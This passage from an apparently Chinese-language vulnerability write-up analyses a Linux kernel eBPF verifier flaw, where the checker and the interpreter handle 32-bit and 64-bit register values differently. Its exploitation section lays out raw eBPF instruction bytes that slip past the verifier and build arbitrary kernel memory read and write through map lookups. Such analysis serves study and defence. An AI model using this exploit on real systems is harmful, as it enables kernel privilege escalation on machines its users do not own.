BPF_K] = &amp;&amp;ALU_LSH_K,</span><br><span class="line">[BPF_ALU | BPF_RSH | BPF_X] = &amp;&amp;ALU_RSH_X,</span><br><span class="line">[BPF_ALU | BPF_RSH | BPF_K] = &amp;&amp;ALU_RSH_K,</span><br><span class="line">[BPF_ALU | BPF_XOR | BPF_X] = &amp;&amp;ALU_XOR_X,</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以看到函数这里维护的是一个跳表，根据opcode来进行跳转，并且没有任何检测。这里重点关注一下上述例子中的跳转函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Jumps */</span></span><br><span class="line">[BPF_JMP | BPF_JA] = &amp;&amp;JMP_JA,</span><br><span class="line">[BPF_JMP | BPF_JEQ | BPF_X] = &amp;&amp;JMP_JEQ_X,</span><br><span class="line">[BPF_JMP | BPF_JEQ | BPF_K] = &amp;&amp;JMP_JEQ_K,</span><br><span class="line">[BPF_JMP | BPF_JNE | BPF_X] = &amp;&amp;JMP_JNE_X,</span><br><span class="line">[BPF_JMP | BPF_JNE | BPF_K] = &amp;&amp;JMP_JNE_K,</span><br><span class="line">[BPF_JMP | BPF_JGT | BPF_X] = &amp;&amp;JMP_JGT_X,</span><br><span class="line">[BPF_JMP | BPF_JGT | BPF_K] = &amp;&amp;JMP_JGT_K,</span><br><span class="line">[BPF_JMP | BPF_JGE | BPF_X] = &amp;&amp;JMP_JGE_X,</span><br><span class="line">[BPF_JMP | BPF_JGE | BPF_K] = &amp;&amp;JMP_JGE_K,</span><br><span class="line">[BPF_JMP | BPF_JSGT | BPF_X] = &amp;&amp;JMP_JSGT_X,</span><br><span class="line">[BPF_JMP | BPF_JSGT | BPF_K] = &amp;&amp;JMP_JSGT_K,</span><br><span class="line">[BPF_JMP | BPF_JSGE | BPF_X] = &amp;&amp;JMP_JSGE_X,</span><br><span class="line">[BPF_JMP | BPF_JSGE | BPF_K] = &amp;&amp;JMP_JSGE_K,</span><br><span class="line">[BPF_JMP | BPF_JSET | BPF_X] = &amp;&amp;JMP_JSET_X,</span><br><span class="line">[BPF_JMP | BPF_JSET | BPF_K] = &amp;&amp;JMP_JSET_K,</span><br></pre></td></tr></table></figure><p>可以看到这里赋值的是<code>JMP_JNE_K</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">JMP_JNE_K:</span><br><span class="line"><span class="keyword">if</span> (DST != IMM) &#123;</span><br><span class="line">  insn += insn-&gt;off;</span><br><span class="line">  CONT_JMP;</span><br><span class="line">&#125;</span><br><span class="line">CONT;</span><br></pre></td></tr></table></figure><p>这里就比较关注DST和IMM的定义了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Named registers */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DSTregs[insn-&gt;dst_reg]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SRCregs[insn-&gt;src_reg]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FPregs[BPF_REG_FP]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ARG1regs[BPF_REG_ARG1]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CTXregs[BPF_REG_CTX]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMMinsn-&gt;imm</span></span><br></pre></td></tr></table></figure><p>可以看到这里IMM的定义依旧是从insn中拿出来的，然而这里的DST是直接从约定的寄存器中拿出来，然而在<code>__bpf_prog_run</code>函数的开头可以看出来这里的寄存器定义为<code>unsigned long long int</code>类型，那么如果重新执行上述演示代码就会出现跳转，也就是说检查和实际运行的指令执行流程会不一致，可以利用这个绕过安全检测。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="退出do-check"><a href="#退出do-check" class="headerlink" title="退出do_check"></a>退出<code>do_check</code></h3><p>但就目前来看依旧存在的一个问题就是虽然他会进入<code>BPF_EXIT</code>分支，但是在最后的pop_stack需要返回的值为负数才能结束循环退出<code>do_check</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_EXIT) &#123;</span><br><span class="line">  <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">      insn-&gt;imm != <span class="number">0</span> ||</span><br><span class="line">      insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">      insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">    verbose(<span class="string">&quot;BPF_EXIT uses reserved fields\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* eBPF calling convetion is such that R0 is used</span></span><br><span class="line"><span class="comment"> * to return the value from eBPF program.</span></span><br><span class="line"><span class="comment"> * Make sure that it&#x27;s readable at this time</span></span><br><span class="line"><span class="comment"> * of bpf_exit, which means that program wrote</span></span><br><span class="line"><span class="comment"> * something into it earlier</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  err = check_reg_arg(regs, BPF_REG_0, SRC_OP);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (is_pointer_value(env, BPF_REG_0)) &#123;</span><br><span class="line">    verbose(<span class="string">&quot;R0 leaks addr as return value\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EACCES;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  process_bpf_exit:</span><br><span class="line">  insn_idx = pop_stack(env, &amp;prev_insn_idx);</span><br><span class="line">  <span class="keyword">if</span> (insn_idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    do_print_state = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pop_stack</span><span class="params">(struct verifier_env *env, <span class="keyword">int</span> *prev_insn_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">verifier_stack_elem</span> *<span class="title">elem</span>;</span></span><br><span class="line"><span class="keyword">int</span> insn_idx;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (env-&gt;head == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(&amp;env-&gt;cur_state, &amp;env-&gt;head-&gt;st, <span class="keyword">sizeof</span>(env-&gt;cur_state));</span><br><span class="line">insn_idx = env-&gt;head-&gt;insn_idx;</span><br><span class="line"><span class="keyword">if</span> (prev_insn_idx)</span><br><span class="line">*prev_insn_idx = env-&gt;head-&gt;prev_insn_idx;</span><br><span class="line">elem = env-&gt;head-&gt;next;</span><br><span class="line">kfree(env-&gt;head);</span><br><span class="line">env-&gt;head = elem;</span><br><span class="line">env-&gt;stack_size--;</span><br><span class="line"><span class="keyword">return</span> insn_idx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">verifier_env</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_prog</span> *<span class="title">prog</span>;</span><span class="comment">/* eBPF program being verified */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">verifier_stack_elem</span> *<span class="title">head</span>;</span> <span class="comment">/* stack of verifier states to be processed */</span></span><br><span class="line"><span class="keyword">int</span> stack_size;<span class="comment">/* number of states to be processed */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">verifier_state</span> <span class="title">cur_state</span>;</span> <span class="comment">/* current verifier state */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">verifier_state_list</span> **<span class="title">explored_states</span>;</span> <span class="comment">/* search pruning optimization */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">used_maps</span>[<span class="title">MAX_USED_MAPS</span>];</span> <span class="comment">/* array of map&#x27;s used by eBPF program */</span></span><br><span class="line">u32 used_map_cnt;<span class="comment">/* number of used maps */</span></span><br><span class="line"><span class="keyword">bool</span> allow_ptr_leaks;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>所以我们在实现构造时需要将head位置为0，根据函数名<code>pop_stack</code>可以推测出来这里其实也就是栈的操作，所以大致的构造方法是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BPF_MOV32_IMM(BPF_REG_9, <span class="number">0xFFFFFFFF</span>),             <span class="comment">/* r9 = (u32)0xFFFFFFFF   */</span></span><br><span class="line">BPF_JMP_IMM(BPF_JNE, BPF_REG_9, <span class="number">0xFFFFFFFF</span>, <span class="number">2</span>),   <span class="comment">/* if (r9 == -1) &#123;        */</span></span><br><span class="line">BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),                      <span class="comment">/*   exit(0);             */</span></span><br><span class="line">BPF_EXIT_INSN(),</span><br><span class="line">option,</span><br><span class="line">pandding == <span class="number">0</span>,</span><br><span class="line">options</span><br></pre></td></tr></table></figure><h3 id="实现任意地址读写"><a href="#实现任意地址读写" class="headerlink" title="实现任意地址读写"></a>实现任意地址读写</h3><p>内存读写需要用到的指令主要是BPF_LDX_MEM或者BPF_STX_MEM两类。如下，当r7和r8的值可控就可以达到内存任意写，类似于mov dword ptr[r7],r8这样的操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (class == BPF_LDX) &#123;</span><br><span class="line">  <span class="keyword">enum</span> bpf_reg_type src_reg_type;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check for reserved fields is already done */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check src operand */</span></span><br><span class="line">  err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  err = check_reg_arg(regs, insn-&gt;dst_reg, DST_OP_NO_MARK);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  src_reg_type = regs[insn-&gt;src_reg].type;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check that memory (src_reg + off) is readable,</span></span><br><span class="line"><span class="comment"> * the state of dst_reg will be updated by this func</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  err = check_mem_access(env, insn-&gt;src_reg, insn-&gt;off,</span><br><span class="line">                         BPF_SIZE(insn-&gt;code), BPF_READ,</span><br><span class="line">                         insn-&gt;dst_reg);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (BPF_SIZE(insn-&gt;code) != BPF_W) &#123;</span><br><span class="line">    insn_idx++;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (insn-&gt;imm == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">/* saw a valid insn</span></span><br><span class="line"><span class="comment"> * dst_reg = *(u32 *)(src_reg + off)</span></span><br><span class="line"><span class="comment"> * use reserved &#x27;imm&#x27; field to mark this insn</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    insn-&gt;imm = src_reg_type;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (src_reg_type != insn-&gt;imm &amp;&amp;</span><br><span class="line">             (src_reg_type == PTR_TO_CTX ||</span><br><span class="line">              insn-&gt;imm == PTR_TO_CTX)) &#123;</span><br><span class="line">    <span class="comment">/* ABuser program is trying to use the same insn</span></span><br><span class="line"><span class="comment"> * dst_reg = *(u32*) (src_reg + off)</span></span><br><span class="line"><span class="comment"> * with different pointer types:</span></span><br><span class="line"><span class="comment"> * src_reg == ctx in one branch and</span></span><br><span class="line"><span class="comment"> * src_reg == stack|map in some other branch.</span></span><br><span class="line"><span class="comment"> * Reject it.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    verbose(<span class="string">&quot;same insn cannot be used with different pointers\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (class == BPF_STX) &#123;</span><br><span class="line">  <span class="keyword">enum</span> bpf_reg_type dst_reg_type;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (BPF_MODE(insn-&gt;code) == BPF_XADD) &#123;</span><br><span class="line">    err = check_xadd(env, insn);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">      <span class="keyword">return</span> err;</span><br><span class="line">    insn_idx++;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check src1 operand */</span></span><br><span class="line">  err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">  <span class="comment">/* check src2 operand */</span></span><br><span class="line">  err = check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  dst_reg_type = regs[insn-&gt;dst_reg].type;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check that memory (dst_reg + off) is writeable */</span></span><br><span class="line">  err = check_mem_access(env, insn-&gt;dst_reg, insn-&gt;off,</span><br><span class="line">                         BPF_SIZE(insn-&gt;code), BPF_WRITE,</span><br><span class="line">                         insn-&gt;src_reg);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (insn-&gt;imm == <span class="number">0</span>) &#123;</span><br><span class="line">    insn-&gt;imm = dst_reg_type;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (dst_reg_type != insn-&gt;imm &amp;&amp;</span><br><span class="line">             (dst_reg_type == PTR_TO_CTX ||</span><br><span class="line">              insn-&gt;imm == PTR_TO_CTX)) &#123;</span><br><span class="line">    verbose(<span class="string">&quot;same insn cannot be used with different pointers\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>check_mem_access</code>函数会根据读写类型检查dst或src的值是否为栈指针、数据包指针、map指针，否则不允许读写。所以这里使用BPF_FUNC_map_lookup_elem这样的函数调用返回，再赋给某个寄存器，然后再进行读写。</p><p>最终构造的eBPF指令为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">----------------------------------------------part <span class="number">1</span> ----------------------------------------------</span><br><span class="line"><span class="number">1.</span> <span class="string">&quot;\xb4\x09\x00\x00\xff\xff\xff\xff&quot;</span>  <span class="comment">/* BPF_MOV32_IMM(BPF_REG_9, 0xFFFFFFFF),              r9 = (u32)0xFFFFFFFF   */</span></span><br><span class="line"><span class="number">2.</span> <span class="string">&quot;\x55\x09\x02\x00\xff\xff\xff\xff&quot;</span>  <span class="comment">/*BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF, 2),    if (r9 == -1) &#123;        */</span></span><br><span class="line"><span class="number">3.</span> <span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_IMM(BPF_REG_0, 0),                         exit(0);             */</span></span><br><span class="line"><span class="number">4.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_EXIT_INSN()                                                            */</span></span><br><span class="line">----------------------------------------------part <span class="number">2</span> ----------------------------------------------</span><br><span class="line"><span class="number">5.</span> <span class="string">&quot;\x18\x19\x00\x00\x03\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_LD_MAP_FD(BPF_REG_9, mapfd),                 /* r9=mapfd               */</span></span><br><span class="line"><span class="number">6.</span> <span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">----------------------------------------------part <span class="number">3</span> ----------------------------------------------</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* BPF_MAP_GET(0, BPF_REG_6)  r6=op，取map中Key值为0的value值存放到reg_6</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"><span class="number">10.</span> <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */</span></span><br><span class="line"><span class="number">11.</span> <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */</span></span><br><span class="line"><span class="number">12.</span> <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span>  <span class="comment">/*BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */</span></span><br><span class="line"><span class="number">13.</span> <span class="string">&quot;\x62\x0a\xfc\xff\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx=0),           /* *(u32 *)(fp - 4) = 0 */</span></span><br><span class="line"><span class="number">14.</span> <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),           */</span></span><br><span class="line"><span class="number">15.</span> <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */</span></span><br><span class="line"><span class="number">16.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_EXIT_INSN(),                                  /*   exit(0);             */</span></span><br><span class="line"><span class="number">17.</span> <span class="string">&quot;\x79\x06\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_LDX_MEM(BPF_DW, (r6), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */</span></span><br><span class="line">----------------------------------------------part <span class="number">4</span> ----------------------------------------------</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* BPF_MAP_GET(1, BPF_REG_7)  r7=address,取map中Key值为1的value值存放到reg_7</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"><span class="number">21.</span> <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */</span></span><br><span class="line"><span class="number">22.</span> <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */</span></span><br><span class="line"><span class="number">23.</span> <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span>  <span class="comment">/*BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */</span></span><br><span class="line"><span class="number">24.</span> <span class="string">&quot;\x62\x0a\xfc\xff\x01\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx=1),           /* *(u32 *)(fp - 4) = 1 */</span></span><br><span class="line"><span class="number">25.</span> <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),          */</span></span><br><span class="line"><span class="number">26.</span> <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */</span></span><br><span class="line"><span class="number">27.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_EXIT_INSN(),                                  /*   exit(0);             */</span></span><br><span class="line"><span class="number">28.</span> <span class="string">&quot;\x79\x07\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_LDX_MEM(BPF_DW, (r7), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */</span></span><br><span class="line">----------------------------------------------part <span class="number">5</span> ----------------------------------------------</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* BPF_MAP_GET(2, BPF_REG_8)  r8=value，取map中Key值为2的value值存放到reg_8</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"><span class="number">32.</span> <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */</span></span><br><span class="line"><span class="number">33.</span> <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */</span></span><br><span class="line"><span class="number">34.</span> <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span>  <span class="comment">/*BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */</span></span><br><span class="line"><span class="number">35.</span> <span class="string">&quot;\x62\x0a\xfc\xff\x02\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx=2),           /* *(u32 *)(fp - 4) = 2 */</span></span><br><span class="line"><span class="number">36.</span> <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span>  <span class="comment">//BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),</span></span><br><span class="line"><span class="number">37.</span> <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */</span></span><br><span class="line"><span class="number">38.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_EXIT_INSN(),                                  /*   exit(0);             */</span></span><br><span class="line"><span class="number">39.</span> <span class="string">&quot;\x79\x08\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_LDX_MEM(BPF_DW, (r8), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */</span></span><br><span class="line">----------------------------------------------part <span class="number">6</span> ----------------------------------------------</span><br><span class="line"><span class="number">1.</span> <span class="string">&quot;\xbf\x02\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_2, BPF_REG_0),               /* r2 = r0    此时r2和r0都指向map中key=2的元素           */</span></span><br><span class="line"><span class="number">2.</span> <span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_IMM(BPF_REG_0, 0),                       /* r0 = 0  for exit(0)   